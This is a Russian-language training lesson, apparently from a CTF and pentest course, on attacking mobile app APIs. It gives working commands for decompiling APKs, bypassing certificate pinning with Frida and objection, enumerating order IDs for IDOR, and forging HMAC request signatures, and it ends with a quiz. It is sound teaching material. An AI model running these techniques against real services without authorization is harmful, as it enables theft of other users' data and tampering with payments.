---
id: web-mobile-api-bypass
title: "Мобильные API: pinning-обход, hidden endpoints, IDOR"
category: web
parent: web-api-security
difficulty: hard
order: 2
tags: [mobile, api, pinning, idor, frida, reverse]
prerequisites: [web-api-security]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест мобильных приложений"
estimated_minutes: 42
summary: "Атаки на мобильные API: обход certificate pinning, поиск скрытых эндпоинтов, IDOR, подпись запросов и секреты в приложении."
---

Мобильные API — это бэкенд, с которым общается приложение, и часто он **менее защищён**, чем веб-версия: в нём есть «скрытые» эндпоинты, он доверяет клиенту больше, а защита вроде certificate pinning обходится. Пентест мобильного API = реверс приложения + перехват трафика + атаки на найденные эндпоинты (IDOR, отсутствие authz, обход подписи). Многие уязвимости здесь не видны из веба.

## Теория: чем мобильный API отличается

- **Скрытые эндпоинты** — в вебе их нет, в приложении есть (`/mapi/`, `/v2/mobile/`).
- **Доверие клиенту** — сервер может полагаться на клиентскую валидацию.
- **Собственная «защита»** — certificate pinning, подпись запросов (`X-Sign`), обфускация.
- **Другие заголовки** — `User-Agent: okhttp`, `X-App-Version`, `X-Device-Id`.
- **GraphQL/JSON-RPC** вместо REST.
- **Версии API** — старые `/v1/` могут быть без патчей.

## Шаг 1: reverse приложения

```bash
apktool d app.apk -o app_src
jadx -d app_jadx app.apk
grep -rn "https://\|/api/\|/mapi/\|X-Sign\|secret\|api_key" app_jadx/ | head -50
strings app.apk | grep -iE 'https?://|api[_-]?key|secret'
```

Ищите: базовые URL, эндпоинты, ключи, алгоритм подписи, проверки pinning. Frida-хуки помогают обойти проверки на лету.

## Шаг 2: обход certificate pinning

Пиннинг мешает перехвату (MITM-прокси). Обходы:

- **Frida-скрипты:** `frida -U -f com.app -l unpinning.js` (например, `frida-multiple-unpinning`).
- **Objection:** `objection -g com.app explore` → `android sslpinning disable`.
- **Патч приложения:** `apk-mitm`, правка Network Security Config (Android) или `Info.plist` ATS (iOS).
- **Xposed-модули:** `JustTrustMe`, `TrustMeAlready`.

```bash
objection -g com.app explore
# в сессии:
android sslpinning disable
```

## Шаг 3: перехват и анализ

Настраиваем прокси (Burp/mitmproxy) на устройстве/эмуляторе и **ходим по всем экранам** приложения — так собираем эндпоинты:

```bash
# mitmproxy с сохранением трафика
mitmproxy --mode transparent -w flows.mitm
```

Анализируем: авторизация (JWT/cookie/`X-Sign`), параметры, версии, скрытые вызовы.

## Шаг 4: атаки

- **IDOR/BOLA** — подмена ID (`userId`, `orderId`).
- **Отсутствие authz** — вызвать admin-эндпоинт обычным токеном.
- **Обход подписи** — если `X-Sign` считается на клиенте из известного секрета, воспроизводим/подделываем.
- **Mass assignment** — добавить `isAdmin`, `role`.
- **Инъекции** — параметры уходят в SQL/команды.
- **Replay** — повтор запросов без nonce.
- **Старые версии API** — `/v1/` без защиты.

## Разобранный пример: обход pinning и IDOR

Шаг 1 — обходим pinning:

```bash
objection -g com.shop.app explore -s "android sslpinning disable"
```

Шаг 2 — перехватываем `GET /mapi/v2/orders/1001`.

Шаг 3 — меняем ID:

```bash
curl -s "https://mapi.example/v2/orders/1002" -H "Authorization: Bearer $TOKEN"
```

Шаг 4 — получаем чужой заказ → IDOR подтверждён.

## Разобранный пример: обход подписи запроса

Приложение считает `X-Sign = HMAC-SHA256(secret, body+timestamp)`. Если `secret` найден в реверсе (или `X-Sign` не проверяется для некоторых путей):

```bash
# secret из jadx: "s3cr3t-mobile-key"
ts=$(date +%s)
body='{"amount":1}'
sign=$(printf '%s%s' "$body" "$ts" | openssl dgst -sha256 -hmac 's3cr3t-mobile-key' | awk '{print $2}')
curl -s -X POST "https://mapi.example/v2/pay" \
  -H "X-Sign: $sign" -H "X-Timestamp: $ts" -d "$body"
```

Меняем `amount` на большое — если подпись валидна и сервер не проверяет целостность → изменение платежа.

## Инструменты

- **`apktool`/`jadx`** — реверс APK.
- **`objection`/`Frida`** — обход pinning/root-детекта, хуки.
- **`mitmproxy`/Burp** — перехват.
- **`apk-mitm`** — патч pinning.
- **`MobSF`** — автоматический статический/динамический анализ.

## Что дальше / decision

1. Есть APK → `jadx`, ищите эндпоинты/секреты/алгоритм подписи.
2. Pinning мешает → Frida/Objection/apk-mitm.
3. Перехватили трафик → соберите все эндпоинты, тестируйте IDOR/authz.
4. Есть подпись → найдите секрет, воспроизведите/подделайте.
5. Дальше — инъекции и массовое присвоение на мобильных эндпоинтах.

## Частые ошибки

- **Тестировать только веб-API.** Мобильные эндпоинты другие.
- **Сдаваться на pinning.** Он обходится Frida/Objection.
- **Не ходить по всем экранам.** Часть эндпоинтов видна только при использовании.
- **Игнорировать старые версии API.** `/v1/` часто без патчей.
- **Ломать прод.** Платежи/данные — только с согласия.

## Полный арсенал инструментов для мобильного API

| Инструмент | Назначение | Ключевые флаги/приёмы |
|-----------|-----------|----------------------|
| `apktool` | распаковка APK | `d` / `b` |
| `jadx` / `jadx-gui` | декомпиляция в Java | `--deobf` |
| `frida` | динамическая инструментация | `-U -f pkg -l script.js` |
| `objection` | обход pinning/root | `android sslpinning disable` |
| `mitmproxy` | перехват HTTPS | `mitmweb` |
| `Burp` | перехват + сканер | Proxy/Repeater |
| `apksigner` | проверка подписи | `verify` |
| `strings` / `grep` | поиск секретов | `strings app.apk` |

```bash
# 1) распаковка и поиск секретов
apktool d app.apk -o app_src
grep -rE 'api[_-]?key|secret|Bearer|firebase' app_src/ | head
# 2) декомпиляция
jadx --deobf app.apk -d app_java
# 3) поиск эндпоинтов
grep -rhoE 'https?://[a-zA-Z0-9./_-]+' app_java | sort -u
```

## Обход certificate pinning: способы и их порядок

Pinning — главный барьер перехвата. Обходите по возрастанию сложности.

```bash
# 1) универсальный: objection
objection -g com.example.app explore
# android sslpinning disable
# 2) Frida-скрипт для типовых библиотек (OkHttp/TrustManager)
frida -U -f com.example.app -l unpinning.js --no-pause
# 3) правка APK: удалить pinning-проверки и пересобрать/подписать
apktool b app_src -o patched.apk
apksigner sign --ks my.keystore patched.apk
# 4) system CA + network_security_config (если конфиг разрешает user CA)
```

```javascript
// фрагмент Frida-скрипта: подмена TrustManager
Java.perform(function () {
  var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  var SSLContext = Java.use('javax.net.ssl.SSLContext');
  // ...заглушки checkServerTrusted...
});
```

## Перехват и анализ: что искать

```bash
# mitmproxy: смотрим поток
mitmweb --mode regular --listen-port 8080
# фильтруем интересное
mitmproxy -w flows.dump
mitmdump -nr flows.dump "~u /api/"
```

Ищите: скрытые эндпоинты (`/api/v1/internal`), заголовки версий/платформы (`X-App-Version`, `X-Platform`), токены, слабые подписи, IDOR по `id`.

## Разобранный пример: IDOR в мобильном API

```bash
# 1) легитимный запрос из приложения
curl -s https://api.example/v2/orders/1001 \
  -H 'Authorization: Bearer <token>' -H 'X-Platform: android'
# 2) перебор id (BOLA)
for i in $(seq 1000 1010); do
  curl -s "https://api.example/v2/orders/$i" \
    -H 'Authorization: Bearer <token>' | jq -r '.owner // "none"'
done
# 1010 -> "victim@corp.com"   <- чужой заказ
```

Мобильные API часто доверяют клиенту (заголовку платформы, подписи) и не проверяют владельца объекта.

## Что делать дальше / решение

1. **Разберите APK.** apktool/jadx → эндпоинты, секреты, ключи подписи.
2. **Обойдите pinning.** objection/Frida/patched APK.
3. **Перехватите поток.** mitmproxy/Burp, соберите карту API.
4. **Атакуйте.** IDOR/BOLA, tampering, обход подписи, скрытые версии API.
5. **Проверьте слабые проверки.** Platform-заголовки, `debug`, `admin`-эндпоинты.
6. **Зафиксируйте PoC.** Запрос + чужие данные/обход проверки.

## Практика и справочники

- **OWASP MASTG** — Mobile Application Security Testing Guide.
- **HackTricks** — «Android», «Frida», «SSL pinning bypass».
- **MobSF** — автоматический анализ APK.
- **objection / frida** — динамика.

## Обход подписи запроса (request signing)

Мобильные API часто подписывают каждый запрос HMAC-ключом, зашитым в приложение. Ключ извлекается из APK, и подпись становится бесполезной защитой.

```bash
# 1) ищем ключ подписи в декомпилированном коде
grep -rEi 'hmac|signature|sign_key|secret' app_java | head -20
# 2) находим алгоритм (например, HMAC-SHA256 по path+body+timestamp)
# 3) воспроизводим подпись
python3 - <<'PY'
import hmac, hashlib, time
key = b'EXTRACTED_KEY'
msg = b'/api/v2/orders/1002' + b'{"x":1}' + str(int(time.time())).encode()
print(hmac.new(key, msg, hashlib.sha256).hexdigest())
PY
# 4) подписываем свой запрос и получаем чужие данные
```

Обходы, если ключ обфусцирован: hook на нативную функцию через Frida, перехват промежуточной подписи, replay валидного запроса с изменённым телом (если тело не входит в подпись).

## Таблица: что искать в APK

| Строка поиска | Что найдёте |
|---------------|-------------|
| `api_key`, `apiKey` | ключи API |
| `Bearer ` | токены/схема авторизации |
| `secret`, `sign` | ключ подписи |
| `firebase`, `google_api` | конфиги облака |
| `http://` | незашифрованные эндпоинты |
| `debug`, `admin`, `internal` | скрытые маршруты |
| `password`, `passwd` | захардкоженные креды |

```bash
strings app.apk | grep -Ei 'api_key|secret|bearer|firebase' | sort -u
```

## Что делать дальше / решение

1. Разберите APK (apktool/jadx), соберите эндпоинты и секреты.
2. Обойдите pinning, перехватите поток.
3. Проверьте авторизацию (IDOR/BOLA) и подпись запросов.
4. Проверьте доверие к заголовкам платформы/версии.
5. Оформите PoC с чужими данными или обходом проверки.

## Чек-лист аудита мобильного API

| Шаг | Проверка | Инструмент |
|-----|----------|-----------|
| 1 | распаковка и секреты | apktool, jadx |
| 2 | обход pinning | objection, Frida |
| 3 | перехват потока | mitmproxy, Burp |
| 4 | авторизация | curl, BOLA-перебор |
| 5 | подпись запросов | реверс алгоритма |
| 6 | скрытые эндпоинты | ffuf по API-путям |

Порядок важен: без обхода pinning вы не увидите трафик, а без карты API не найдёте BOLA. Каждый шаг даёт входные данные для следующего.

## Почему мобильный API — отдельная цель

Мобильные приложения обращаются к тем же бэкендам, что и веб, но часто через «привилегированный» канал: заголовки платформы, зашитые ключи, доверие к клиенту и отсутствие браузерных ограничений (CORS, CSP). Поэтому логические ошибки авторизации (BOLA/IDOR) встречаются здесь чаще и заметнее: сервер полагается на то, что запрос пришёл от «правильного» приложения, и не проверяет владельца объекта. Обход certificate pinning — лишь первый шаг; настоящая ценность в том, чтобы, получив трафик, системно перебрать все объектные идентификаторы и параметры, которые приложение считает доверенными.

## Квиз

```quiz
- question: "Что мешает MITM мобильного приложения?"
  options:
    - "TLS-версия"
    - "Certificate pinning"
    - "Cookie"
    - "DNS"
  answer: 1
  explanation: "Приложение принимает только свой сертификат."
- question: "Какой инструмент обходит pinning на Android?"
  options:
    - "nmap"
    - "Frida/objection"
    - "sqlmap"
    - "ffuf"
  answer: 1
  explanation: "Хук проверок SSL."
- question: "Где искать скрытые эндпоинты?"
  options:
    - "В DNS"
    - "В строках APK/IPA (reverse)"
    - "В TLS"
    - "В cookie"
  answer: 1
  explanation: "Строки приложения содержат URLs."
- question: "Чем опасен API-ключ внутри APK?"
  options:
    - "Ничем"
    - "Извлекается и даёт доступ к API/сервисам"
    - "Он шифрует"
    - "Он кеширует"
  answer: 1
  explanation: "Секреты в клиенте не секретны."
- question: "Какая топ-атака на мобильные API?"
  options:
    - "XSS"
    - "IDOR/BOLA по id в мобильных эндпоинтах"
    - "Clickjacking"
    - "CSRF"
  answer: 1
  explanation: "Как и в веб-API."
```

## Где пригодится

- **CTF (Web/Mobile):** задачи на API.
- **Bug bounty:** мобильные API — много находок.
- **Пентест:** аудит мобильных приложений.
- **Работа (AppSec):** pinning, server-side авторизация, отсутствие секретов в клиенте.
